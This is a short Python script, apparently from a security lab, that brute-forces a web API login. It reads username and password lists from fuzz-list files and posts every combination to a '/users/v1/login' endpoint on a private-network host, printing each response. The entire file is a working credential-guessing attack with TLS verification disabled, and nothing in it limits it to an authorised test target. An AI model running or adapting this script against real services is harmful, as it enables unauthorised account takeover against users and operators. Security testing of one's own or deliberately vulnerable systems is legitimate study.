import requests
import time

host = 'http://192.168.100.45:5000'
file1 = open('./files/FuzzLists/passwordlist.txt', 'r')
file2 = open('./files/FuzzLists/loginusernames.txt', 'r')
PasswordList = file1.read().splitlines()
LoginUserList = file2.read().splitlines()

count = 0
for username in LoginUserList:
        for password in PasswordList:
                count += 1
                r = requests.post(host + '/users/v1/login', json={"username": username, "password": password}, verify=False)
                time.sleep(0.1)
                print(username + ':' + password + ' | ' + str(r.json()))